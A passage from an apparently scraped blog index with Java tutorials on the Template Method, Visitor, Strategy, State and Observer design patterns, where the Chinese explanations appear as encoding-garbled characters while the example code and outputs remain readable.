æ­¥éª¤1åˆ›å»ºä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒçš„æ¨¡æ¿æ–¹æ³•è¢«è®¾ç½®ä¸º finalã€‚ Game.java public abstract class Game { abstract void initialize(); abstract void startPlay(); abstract void endPlay(); //æ¨¡æ¿ public final void play(){ //åˆå§‹åŒ–æ¸¸æˆ initialize(); //å¼€å§‹æ¸¸æˆ startPlay(); //ç»“æŸæ¸¸æˆ endPlay(); } } æ­¥éª¤ 2åˆ›å»ºæ‰©å±•äº†ä¸Šè¿°ç±»çš„å®ä½“ç±»ã€‚ Cricket.java public class Cricket extends Game { @Override void endPlay() { System.out.println(&quot;Cricket Game Finished!&quot;); } @Override void initialize() { System.out.println(&quot;Cricket Game Initialized! Start playing.&quot;); } @Override void startPlay() { System.out.println(&quot;Cricket Game Started. Enjoy the game!&quot;); } } Football.java public class Football extends Game { @Override void endPlay() { System.out.println(&quot;Football Game Finished!&quot;); } @Override void initialize() { System.out.println(&quot;Football Game Initialized! Start playing.&quot;); } @Override void startPlay() { System.out.println(&quot;Football Game Started. Enjoy the game!&quot;); } } æ­¥éª¤ 3ä½¿ç”¨ Game çš„æ¨¡æ¿æ–¹æ³• play() æ¥æ¼”ç¤ºæ¸¸æˆçš„å®šä¹‰æ–¹å¼ã€‚ TemplatePatternDemo.java public class TemplatePatternDemo { public static void main(String[] args) { Game game = new Cricket(); game.play(); System.out.println(); game = new Football(); game.play(); } } æ­¥éª¤ 4æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š Cricket Game Initialized! Start playing. Cricket Game Started. Enjoy the game! Cricket Game Finished! Football Game Initialized! Start playing. Football Game Started. Enjoy the game! Football Game Finished!","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"è®¿é—®è€…æ¨¡å¼","slug":"è®¿é—®è€…æ¨¡å¼","date":"2020-06-13T01:22:33.000Z","updated":"2021-04-11T17:11:29.045Z","comments":true,"path":"è®¿é—®è€…æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F/","excerpt":"è®¿é—®è€… è¡¨ç¤ºä¸€ä¸ªä½œç”¨äºæŸå¯¹è±¡ç»“æ„ä¸­çš„å„å…ƒç´ çš„æ“ä½œã€‚å®ƒä½¿ä½ å¯ä»¥åœ¨ä¸æ”¹å˜å„å…ƒç´ çš„ç±»çš„å‰æä¸‹å®šä¹‰ä½œç”¨äºè¿™äº›å…ƒç´ çš„æ–°æ“ä½œã€‚","text":"è®¿é—®è€… è¡¨ç¤ºä¸€ä¸ªä½œç”¨äºæŸå¯¹è±¡ç»“æ„ä¸­çš„å„å…ƒç´ çš„æ“ä½œã€‚å®ƒä½¿ä½ å¯ä»¥åœ¨ä¸æ”¹å˜å„å…ƒç´ çš„ç±»çš„å‰æä¸‹å®šä¹‰ä½œç”¨äºè¿™äº›å…ƒç´ çš„æ–°æ“ä½œã€‚ è®¿é—®è€…æ¨¡å¼åœ¨è®¿é—®è€…æ¨¡å¼ï¼ˆVisitor Patternï¼‰ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªè®¿é—®è€…ç±»ï¼Œå®ƒæ”¹å˜äº†å…ƒç´ ç±»çš„æ‰§è¡Œç®—æ³•ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå…ƒç´ çš„æ‰§è¡Œç®—æ³•å¯ä»¥éšç€è®¿é—®è€…æ”¹å˜è€Œæ”¹å˜ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚æ ¹æ®æ¨¡å¼ï¼Œå…ƒç´ å¯¹è±¡å·²æ¥å—è®¿é—®è€…å¯¹è±¡ï¼Œè¿™æ ·è®¿é—®è€…å¯¹è±¡å°±å¯ä»¥å¤„ç†å…ƒç´ å¯¹è±¡ä¸Šçš„æ“ä½œã€‚ ä»‹ç»æ„å›¾ï¼šä¸»è¦å°†æ•°æ®ç»“æ„ä¸æ•°æ®æ“ä½œåˆ†ç¦»ã€‚ ä¸»è¦è§£å†³ï¼šç¨³å®šçš„æ•°æ®ç»“æ„å’Œæ˜“å˜çš„æ“ä½œè€¦åˆé—®é¢˜ã€‚ ä½•æ—¶ä½¿ç”¨ï¼šéœ€è¦å¯¹ä¸€ä¸ªå¯¹è±¡ç»“æ„ä¸­çš„å¯¹è±¡è¿›è¡Œå¾ˆå¤šä¸åŒçš„å¹¶ä¸”ä¸ç›¸å…³çš„æ“ä½œï¼Œè€Œéœ€è¦é¿å…è®©è¿™äº›æ“ä½œâ€æ±¡æŸ“â€è¿™äº›å¯¹è±¡çš„ç±»ï¼Œä½¿ç”¨è®¿é—®è€…æ¨¡å¼å°†è¿™äº›å°è£…åˆ°ç±»ä¸­ã€‚ å¦‚ä½•è§£å†³ï¼šåœ¨è¢«è®¿é—®çš„ç±»é‡Œé¢åŠ ä¸€ä¸ªå¯¹å¤–æä¾›æ¥å¾…è®¿é—®è€…çš„æ¥å£ã€‚ å…³é”®ä»£ç ï¼šåœ¨æ•°æ®åŸºç¡€ç±»é‡Œé¢æœ‰ä¸€ä¸ªæ–¹æ³•æ¥å—è®¿é—®è€…ï¼Œå°†è‡ªèº«å¼•ç”¨ä¼ å…¥è®¿é—®è€…ã€‚ åº”ç”¨å®ä¾‹ï¼šæ‚¨åœ¨æœ‹å‹å®¶åšå®¢ï¼Œæ‚¨æ˜¯è®¿é—®è€…ï¼Œæœ‹å‹æ¥å—æ‚¨çš„è®¿é—®ï¼Œæ‚¨é€šè¿‡æœ‹å‹çš„æè¿°ï¼Œç„¶åå¯¹æœ‹å‹çš„æè¿°åšå‡ºä¸€ä¸ªåˆ¤æ–­ï¼Œè¿™å°±æ˜¯è®¿é—®è€…æ¨¡å¼ã€‚ ä¼˜ç‚¹ï¼š 1ã€ç¬¦åˆå•ä¸€èŒè´£åŸåˆ™ã€‚ 2ã€ä¼˜ç§€çš„æ‰©å±•æ€§ã€‚ 3ã€çµæ´»æ€§ã€‚ ç¼ºç‚¹ï¼š 1ã€å…·ä½“å…ƒç´ å¯¹è®¿é—®è€…å…¬å¸ƒç»†èŠ‚ï¼Œè¿åäº†è¿ªç±³ç‰¹åŸåˆ™ã€‚ 2ã€å…·ä½“å…ƒç´ å˜æ›´æ¯”è¾ƒå›°éš¾ã€‚ 3ã€è¿åäº†ä¾èµ–å€’ç½®åŸåˆ™ï¼Œä¾èµ–äº†å…·ä½“ç±»ï¼Œæ²¡æœ‰ä¾èµ–æŠ½è±¡ã€‚ ä½¿ç”¨åœºæ™¯ï¼š 1ã€å¯¹è±¡ç»“æ„ä¸­å¯¹è±¡å¯¹åº”çš„ç±»å¾ˆå°‘æ”¹å˜ï¼Œä½†ç»å¸¸éœ€è¦åœ¨æ­¤å¯¹è±¡ç»“æ„ä¸Šå®šä¹‰æ–°çš„æ“ä½œã€‚ 2ã€éœ€è¦å¯¹ä¸€ä¸ªå¯¹è±¡ç»“æ„ä¸­çš„å¯¹è±¡è¿›è¡Œå¾ˆå¤šä¸åŒçš„å¹¶ä¸”ä¸ç›¸å…³çš„æ“ä½œï¼Œè€Œéœ€è¦é¿å…è®©è¿™äº›æ“ä½œâ€æ±¡æŸ“â€è¿™äº›å¯¹è±¡çš„ç±»ï¼Œä¹Ÿä¸å¸Œæœ›åœ¨å¢åŠ æ–°æ“ä½œæ—¶ä¿®æ”¹è¿™äº›ç±»ã€‚ æ³¨æ„äº‹é¡¹ï¼šè®¿é—®è€…å¯ä»¥å¯¹åŠŸèƒ½è¿›è¡Œç»Ÿä¸€ï¼Œå¯ä»¥åšæŠ¥è¡¨ã€UIã€æ‹¦æˆªå™¨ä¸è¿‡æ»¤å™¨ã€‚ å®ç°æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªå®šä¹‰æ¥å—æ“ä½œçš„ ComputerPart æ¥å£ã€‚Keyboardã€Mouseã€Monitor å’Œ Computer æ˜¯å®ç°äº† ComputerPart æ¥å£çš„å®ä½“ç±»ã€‚æˆ‘ä»¬å°†å®šä¹‰å¦ä¸€ä¸ªæ¥å£ ComputerPartVisitorï¼Œå®ƒå®šä¹‰äº†è®¿é—®è€…ç±»çš„æ“ä½œã€‚Computer ä½¿ç”¨å®ä½“è®¿é—®è€…æ¥æ‰§è¡Œç›¸åº”çš„åŠ¨ä½œã€‚ VisitorPatternDemoï¼Œæˆ‘ä»¬çš„æ¼”ç¤ºç±»ä½¿ç”¨ Computerã€ComputerPartVisitor ç±»æ¥æ¼”ç¤ºè®¿é—®è€…æ¨¡å¼çš„ç”¨æ³•ã€‚ è®¿é—®è€…æ¨¡å¼çš„ UML å›¾ æ­¥éª¤ 1å®šä¹‰ä¸€ä¸ªè¡¨ç¤ºå…ƒç´ çš„æ¥å£ã€‚ ComputerPart.java public interface ComputerPart { public void accept(ComputerPartVisitor computerPartVisitor); } æ­¥éª¤ 2åˆ›å»ºæ‰©å±•äº†ä¸Šè¿°ç±»çš„å®ä½“ç±»ã€‚ Keyboard.java public class Keyboard implements ComputerPart { @Override public void accept(ComputerPartVisitor computerPartVisitor) { computerPartVisitor.visit(this); } } Monitor.java public class Monitor implements ComputerPart { @Override public void accept(ComputerPartVisitor computerPartVisitor) { computerPartVisitor.visit(this); } } Mouse.java public class Mouse implements ComputerPart { @Override public void accept(ComputerPartVisitor computerPartVisitor) { computerPartVisitor.visit(this); } } Computer.java public class Computer implements ComputerPart { ComputerPart[] parts; public Computer(){ parts = new ComputerPart[] {new Mouse(), new Keyboard(), new Monitor()}; } @Override public void accept(ComputerPartVisitor computerPartVisitor) { for (int i = 0; i &lt; parts.length; i++) { parts[i].accept(computerPartVisitor); } computerPartVisitor.visit(this); } } æ­¥éª¤ 3å®šä¹‰ä¸€ä¸ªè¡¨ç¤ºè®¿é—®è€…çš„æ¥å£ã€‚ ComputerPartVisitor.java public interface ComputerPartVisitor { public void visit(Computer computer); public void visit(Mouse mouse); public void visit(Keyboard keyboard); public void visit(Monitor monitor); } æ­¥éª¤ 4åˆ›å»ºå®ç°äº†ä¸Šè¿°ç±»çš„å®ä½“è®¿é—®è€…ã€‚ ComputerPartDisplayVisitor.java public class ComputerPartDisplayVisitor implements ComputerPartVisitor { @Override public void visit(Computer computer) { System.out.println(&quot;Displaying Computer.&quot;); } @Override public void visit(Mouse mouse) { System.out.println(&quot;Displaying Mouse.&quot;); } @Override public void visit(Keyboard keyboard) { System.out.println(&quot;Displaying Keyboard.&quot;); } @Override public void visit(Monitor monitor) { System.out.println(&quot;Displaying Monitor.&quot;); } } æ­¥éª¤ 5ä½¿ç”¨ ComputerPartDisplayVisitor æ¥æ˜¾ç¤º Computer çš„ç»„æˆéƒ¨åˆ†ã€‚ VisitorPatternDemo.java public class VisitorPatternDemo { public static void main(String[] args) { ComputerPart computer = new Computer(); computer.accept(new ComputerPartDisplayVisitor()); } } æ­¥éª¤ 6æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š Displaying Mouse. Displaying Keyboard. Displaying Monitor. Displaying Computer.","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"ç­–ç•¥æ¨¡å¼","slug":"ç­–ç•¥æ¨¡å¼","date":"2020-06-13T01:17:47.000Z","updated":"2021-04-11T17:11:28.979Z","comments":true,"path":"ç­–ç•¥æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/","excerpt":"ç­–ç•¥ å®šä¹‰ä¸€ç³»åˆ—çš„ç®—æ³•ï¼ŒæŠŠå®ƒä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥ï¼Œå¹¶ä¸”ä½¿å®ƒä»¬å¯ç›¸äº’æ›¿æ¢ã€‚æœ¬æ¨¡å¼ä½¿å¾—ç®—æ³•å¯ç‹¬ç«‹äºä½¿ç”¨å®ƒçš„å®¢æˆ·è€Œå˜åŒ–ã€‚","text":"ç­–ç•¥ å®šä¹‰ä¸€ç³»åˆ—çš„ç®—æ³•ï¼ŒæŠŠå®ƒä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥ï¼Œå¹¶ä¸”ä½¿å®ƒä»¬å¯ç›¸äº’æ›¿æ¢ã€‚æœ¬æ¨¡å¼ä½¿å¾—ç®—æ³•å¯ç‹¬ç«‹äºä½¿ç”¨å®ƒçš„å®¢æˆ·è€Œå˜åŒ–ã€‚ ç­–ç•¥æ¨¡å¼ï¼šStrategyï¼Œæ˜¯æŒ‡ï¼Œå®šä¹‰ä¸€ç»„ç®—æ³•ï¼Œå¹¶æŠŠå…¶å°è£…åˆ°ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚ç„¶ååœ¨è¿è¡Œæ—¶ï¼Œå¯ä»¥çµæ´»çš„ä½¿ç”¨å…¶ä¸­çš„ä¸€ä¸ªç®—æ³•ã€‚ ç­–ç•¥æ¨¡å¼åœ¨Javaæ ‡å‡†åº“ä¸­åº”ç”¨éå¸¸å¹¿æ³›ï¼Œæˆ‘ä»¬ä»¥æ’åºä¸ºä¾‹ï¼Œçœ‹çœ‹å¦‚ä½•é€šè¿‡Arrays.sort()å®ç°å¿½ç•¥å¤§å°å†™æ’åºï¼š import java.util.Arrays; ` public class Main { public static void main(String[] args) throws InterruptedException { String[] array = { &quot;apple&quot;, &quot;Pear&quot;, &quot;Banana&quot;, &quot;orange&quot; }; Arrays.sort(array, String::compareToIgnoreCase); System.out.println(Arrays.toString(array)); } } å¦‚æœæˆ‘ä»¬æƒ³å¿½ç•¥å¤§å°å†™æ’åºï¼Œå°±ä¼ å…¥String::compareToIgnoreCaseï¼Œå¦‚æœæˆ‘ä»¬æƒ³å€’åºæ’åºï¼Œå°±ä¼ å…¥(s1, s2) -&gt; -s1.compareTo(s2)ï¼Œè¿™ä¸ªæ¯”è¾ƒä¸¤ä¸ªå…ƒç´ å¤§å°çš„ç®—æ³•å°±æ˜¯ç­–ç•¥ã€‚ æˆ‘ä»¬è§‚å¯ŸArrays.sort(T[] a, Comparator c)è¿™ä¸ªæ’åºæ–¹æ³•ï¼Œå®ƒåœ¨å†…éƒ¨å®ç°äº†TimSortæ’åºï¼Œä½†æ˜¯ï¼Œæ’åºç®—æ³•åœ¨æ¯”è¾ƒä¸¤ä¸ªå…ƒç´ å¤§å°çš„æ—¶å€™ï¼Œéœ€è¦å€ŸåŠ©æˆ‘ä»¬ä¼ å…¥çš„Comparatorå¯¹è±¡ï¼Œæ‰èƒ½å®Œæˆæ¯”è¾ƒã€‚å› æ­¤ï¼Œè¿™é‡Œçš„ç­–ç•¥æ˜¯æŒ‡æ¯”è¾ƒä¸¤ä¸ªå…ƒç´ å¤§å°çš„ç­–ç•¥ï¼Œå¯ä»¥æ˜¯å¿½ç•¥å¤§å°å†™æ¯”è¾ƒï¼Œå¯ä»¥æ˜¯å€’åºæ¯”è¾ƒï¼Œä¹Ÿå¯ä»¥æ ¹æ®å­—ç¬¦ä¸²é•¿åº¦æ¯”è¾ƒã€‚ å› æ­¤ï¼Œä¸Šè¿°æ’åºä½¿ç”¨åˆ°äº†ç­–ç•¥æ¨¡å¼ï¼Œå®ƒå®é™…ä¸ŠæŒ‡ï¼Œåœ¨ä¸€ä¸ªæ–¹æ³•ä¸­ï¼Œæµç¨‹æ˜¯ç¡®å®šçš„ï¼Œä½†æ˜¯ï¼ŒæŸäº›å…³é”®æ­¥éª¤çš„ç®—æ³•ä¾èµ–è°ƒç”¨æ–¹ä¼ å…¥çš„ç­–ç•¥ï¼Œè¿™æ ·ï¼Œä¼ å…¥ä¸åŒçš„ç­–ç•¥ï¼Œå³å¯è·å¾—ä¸åŒçš„ç»“æœï¼Œå¤§å¤§å¢å¼ºäº†ç³»ç»Ÿçš„çµæ´»æ€§ã€‚ å¦‚æœæˆ‘ä»¬è‡ªå·±å®ç°ç­–ç•¥æ¨¡å¼çš„æ’åºï¼Œç”¨å†’æ³¡æ³•ç¼–å†™å¦‚ä¸‹ï¼š public class Main { public static void main(String[] args) throws InterruptedException { String[] array = { &quot;apple&quot;, &quot;Pear&quot;, &quot;Banana&quot;, &quot;orange&quot; }; sort(array, String::compareToIgnoreCase); System.out.println(Arrays.toString(array)); } static &lt;T&gt; void sort(T[] a, Comparator&lt;? super T&gt; c) { for (int i = 0; i &lt; a.length - 1; i++) { for (int j = 0; j &lt; a.length - 1 - i; j++) { if (c.compare(a[j], a[j + 1]) &gt; 0) { // æ³¨æ„è¿™é‡Œæ¯”è¾ƒä¸¤ä¸ªå…ƒç´ çš„å¤§å°ä¾èµ–ä¼ å…¥çš„ç­–ç•¥ T temp = a[j]; a[j] = a[j + 1]; a[j + 1] = temp; } } } } } ä¸€ä¸ªå®Œæ•´çš„ç­–ç•¥æ¨¡å¼è¦å®šä¹‰ç­–ç•¥ä»¥åŠä½¿ç”¨ç­–ç•¥çš„ä¸Šä¸‹æ–‡ã€‚æˆ‘ä»¬ä»¥è´­ç‰©è½¦ç»“ç®—ä¸ºä¾‹ï¼Œå‡è®¾ç½‘ç«™é’ˆå¯¹æ™®é€šä¼šå‘˜ã€Primeä¼šå‘˜æœ‰ä¸åŒçš„æŠ˜æ‰£ï¼ŒåŒæ—¶æ´»åŠ¨æœŸé—´è¿˜æœ‰ä¸€ä¸ªæ»¡100å‡20çš„æ´»åŠ¨ï¼Œè¿™äº›å°±å¯ä»¥ä½œä¸ºç­–ç•¥å®ç°ã€‚å…ˆå®šä¹‰æ‰“æŠ˜ç­–ç•¥æ¥å£ï¼š public interface DiscountStrategy { // è®¡ç®—æŠ˜æ‰£é¢åº¦: BigDecimal getDiscount(BigDecimal total); } æ¥ä¸‹æ¥ï¼Œå°±æ˜¯å®ç°å„ç§ç­–ç•¥ã€‚æ™®é€šç”¨æˆ·ç­–ç•¥å¦‚ä¸‹ï¼š public class UserDiscountStrategy implements DiscountStrategy { public BigDecimal getDiscount(BigDecimal total) { // æ™®é€šä¼šå‘˜æ‰“ä¹æŠ˜: return total.multiply(new BigDecimal(&quot;0.1&quot;)).setScale(2, RoundingMode.DOWN); } } æ»¡å‡ç­–ç•¥å¦‚ä¸‹ï¼š public class OverDiscountStrategy implements DiscountStrategy { public BigDecimal getDiscount(BigDecimal total) { // æ»¡100å‡20ä¼˜æƒ : return total.compareTo(BigDecimal.valueOf(100)) &gt;= 0 ? BigDecimal.valueOf(20) : BigDecimal.ZERO; } } æœ€åï¼Œè¦åº”ç”¨ç­–ç•¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªDiscountContextï¼š public class DiscountContext { // æŒæœ‰æŸä¸ªç­–ç•¥: private DiscountStrategy strategy = new UserDiscountStrategy(); // å…è®¸å®¢æˆ·ç«¯è®¾ç½®æ–°ç­–ç•¥: public void setStrategy(DiscountStrategy strategy) { this.strategy = strategy; } public BigDecimal calculatePrice(BigDecimal total) { return total.subtract(this.strategy.getDiscount(total)).setScale(2); } } è°ƒç”¨æ–¹å¿…é¡»é¦–å…ˆåˆ›å»ºä¸€ä¸ªDiscountContextï¼Œå¹¶æŒ‡å®šä¸€ä¸ªç­–ç•¥ï¼ˆæˆ–è€…ä½¿ç”¨é»˜è®¤ç­–ç•¥ï¼‰ï¼Œå³å¯è·å¾—æŠ˜æ‰£åçš„ä»·æ ¼ï¼š DiscountContext ctx = new DiscountContext(); // é»˜è®¤ä½¿ç”¨æ™®é€šä¼šå‘˜æŠ˜æ‰£: BigDecimal pay1 = ctx.calculatePrice(BigDecimal.valueOf(105)); System.out.println(pay1); // ä½¿ç”¨æ»¡å‡æŠ˜æ‰£: ctx.setStrategy(new OverDiscountStrategy()); BigDecimal pay2 = ctx.calculatePrice(BigDecimal.valueOf(105)); System.out.println(pay2); // ä½¿ç”¨Primeä¼šå‘˜æŠ˜æ‰£: ctx.setStrategy(new PrimeDiscountStrategy()); BigDecimal pay3 = ctx.calculatePrice(BigDecimal.valueOf(105)); System.out.println(pay3); ä¸Šè¿°å®Œæ•´çš„ç­–ç•¥æ¨¡å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚DiscountContextâ”‚â”€ â”€ â”€&gt;â”‚DiscountStrategy â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”œâ”€â”‚UserDiscountStrategy â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”œâ”€â”‚PrimeDiscountStrategyâ”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”‚OverDiscountStrategy â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ ç­–ç•¥æ¨¡å¼çš„æ ¸å¿ƒæ€æƒ³æ˜¯åœ¨ä¸€ä¸ªè®¡ç®—æ–¹æ³•ä¸­æŠŠå®¹æ˜“å˜åŒ–çš„ç®—æ³•æŠ½å‡ºæ¥ä½œä¸ºâ€œç­–ç•¥â€å‚æ•°ä¼ è¿›å»ï¼Œä»è€Œä½¿å¾—æ–°å¢ç­–ç•¥ä¸å¿…ä¿®æ”¹åŸæœ‰é€»è¾‘ã€‚","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"çŠ¶æ€æ¨¡å¼","slug":"çŠ¶æ€æ¨¡å¼","date":"2020-06-13T00:14:10.000Z","updated":"2021-04-11T17:11:28.971Z","comments":true,"path":"çŠ¶æ€æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F/","excerpt":"çŠ¶æ€ å…è®¸ä¸€ä¸ªå¯¹è±¡åœ¨å…¶å†…éƒ¨çŠ¶æ€æ”¹å˜æ—¶æ”¹å˜å®ƒçš„è¡Œä¸ºã€‚å¯¹è±¡çœ‹èµ·æ¥ä¼¼ä¹ä¿®æ”¹äº†å®ƒçš„ç±»ã€‚","text":"çŠ¶æ€ å…è®¸ä¸€ä¸ªå¯¹è±¡åœ¨å…¶å†…éƒ¨çŠ¶æ€æ”¹å˜æ—¶æ”¹å˜å®ƒçš„è¡Œä¸ºã€‚å¯¹è±¡çœ‹èµ·æ¥ä¼¼ä¹ä¿®æ”¹äº†å®ƒçš„ç±»ã€‚ çŠ¶æ€æ¨¡å¼ï¼ˆStateï¼‰ç»å¸¸ç”¨åœ¨å¸¦æœ‰çŠ¶æ€çš„å¯¹è±¡ä¸­ã€‚ ä»€ä¹ˆæ˜¯çŠ¶æ€ï¼Ÿæˆ‘ä»¬ä»¥QQèŠå¤©ä¸ºä¾‹ï¼Œä¸€ä¸ªç”¨æˆ·çš„QQæœ‰å‡ ç§çŠ¶æ€ï¼š ç¦»çº¿çŠ¶æ€ï¼ˆå°šæœªç™»å½•ï¼‰ï¼› æ­£åœ¨ç™»å½•çŠ¶æ€ï¼› åœ¨çº¿çŠ¶æ€ï¼› å¿™çŠ¶æ€ï¼ˆæš‚æ—¶ç¦»å¼€ï¼‰ã€‚ å¦‚ä½•è¡¨ç¤ºçŠ¶æ€ï¼Ÿæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªenumå°±å¯ä»¥è¡¨ç¤ºä¸åŒçš„çŠ¶æ€ã€‚ä½†ä¸åŒçš„çŠ¶æ€éœ€è¦å¯¹åº”ä¸åŒçš„è¡Œä¸ºï¼Œæ¯”å¦‚æ”¶åˆ°æ¶ˆæ¯æ—¶ï¼š if (state == ONLINE) { // é—ªçƒå›¾æ ‡ } else if (state == BUSY) { reply(&quot;ç°åœ¨å¿™ï¼Œç¨åå›å¤&quot;); } else if ... çŠ¶æ€æ¨¡å¼çš„ç›®çš„æ˜¯ä¸ºäº†æŠŠä¸Šè¿°ä¸€å¤§ä¸²if...else...çš„é€»è¾‘ç»™åˆ†æ‹†åˆ°ä¸åŒçš„çŠ¶æ€ç±»ä¸­ï¼Œä½¿å¾—å°†æ¥å¢åŠ çŠ¶æ€æ¯”è¾ƒå®¹æ˜“ã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬è®¾è®¡ä¸€ä¸ªèŠå¤©æœºå™¨äººï¼Œå®ƒæœ‰ä¸¤ä¸ªçŠ¶æ€ï¼š æœªè¿çº¿ï¼› å·²è¿çº¿ã€‚ å¯¹äºæœªè¿çº¿çŠ¶æ€ï¼Œæˆ‘ä»¬æ”¶åˆ°æ¶ˆæ¯ä¹Ÿä¸å›å¤ï¼š public class DisconnectedState implements State { public String init() { return &quot;Bye!&quot;; } public String reply(String input) { return &quot;&quot;; } } å¯¹äºå·²è¿çº¿çŠ¶æ€ï¼Œæˆ‘ä»¬å›åº”æ”¶åˆ°çš„æ¶ˆæ¯ï¼š public class ConnectedState implements State { public String init() { return &quot;Hello, I&#39;m Bob.&quot;; } public String reply(String input) { if (input.endsWith(&quot;?&quot;)) { return &quot;Yes. &quot; + input.substring(0, input.length() - 1) + &quot;!&quot;; } if (input.endsWith(&quot;.&quot;)) { return input.substring(0, input.length() - 1) + &quot;!&quot;; } return input.substring(0, input.length() - 1) + &quot;?&quot;; } } çŠ¶æ€æ¨¡å¼çš„å…³é”®è®¾è®¡æ€æƒ³åœ¨äºçŠ¶æ€åˆ‡æ¢ï¼Œæˆ‘ä»¬å¼•å…¥ä¸€ä¸ªBotContextå®ŒæˆçŠ¶æ€åˆ‡æ¢ï¼š public class BotContext { private State state = new DisconnectedState(); public String chat(String input) { if (&quot;hello&quot;.equalsIgnoreCase(input)) { // æ”¶åˆ°helloåˆ‡æ¢åˆ°åœ¨çº¿çŠ¶æ€: state = new ConnectedState(); return state.init(); } else if (&quot;bye&quot;.equalsIgnoreCase(input)) { / æ”¶åˆ°byeåˆ‡æ¢åˆ°ç¦»çº¿çŠ¶æ€: state = new DisconnectedState(); return state.init(); } return state.reply(input); } } è¿™æ ·ï¼Œä¸€ä¸ªä»·å€¼åƒä¸‡çš„AIèŠå¤©æœºå™¨äººå°±è¯ç”Ÿäº†ï¼š Scanner scanner = new Scanner(System.in); BotContext bot = new BotContext(); for (;;) { System.out.print(&quot;&gt; &quot;); String input = scanner.nextLine(); String output = bot.chat(input); System.out.println(output.isEmpty() ? &quot;(no reply)&quot; : &quot;&lt; &quot; + output); } è¯•è¯•æ•ˆæœï¼š &gt; hello &lt; Hello, I&#39;m Bob. &gt; Nice to meet you. &lt; Nice to meet you! &gt; Today is cold? &lt; Yes. Today is cold! &gt; bye &lt; Bye!","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"è§‚å¯Ÿè€…æ¨¡å¼","slug":"è§‚å¯Ÿè€…æ¨¡å¼","date":"2020-06-13T00:07:09.000Z","updated":"2021-04-11T17:11:29.014Z","comments":true,"path":"è§‚å¯Ÿè€…æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/","excerpt":"è§‚å¯Ÿè€… å®šä¹‰å¯¹è±¡é—´çš„ä¸€ç§ä¸€å¯¹å¤šçš„ä¾èµ–å…³ç³»ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ–äºå®ƒçš„å¯¹è±¡éƒ½å¾—åˆ°é€šçŸ¥å¹¶è¢«è‡ªåŠ¨æ›´æ–°ã€‚","text":"è§‚å¯Ÿè€… å®šä¹‰å¯¹è±¡é—´çš„ä¸€ç§ä¸€å¯¹å¤šçš„ä¾èµ–å…³ç³»ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ–äºå®ƒçš„å¯¹è±¡éƒ½å¾—åˆ°é€šçŸ¥å¹¶è¢«è‡ªåŠ¨æ›´æ–°ã€‚ 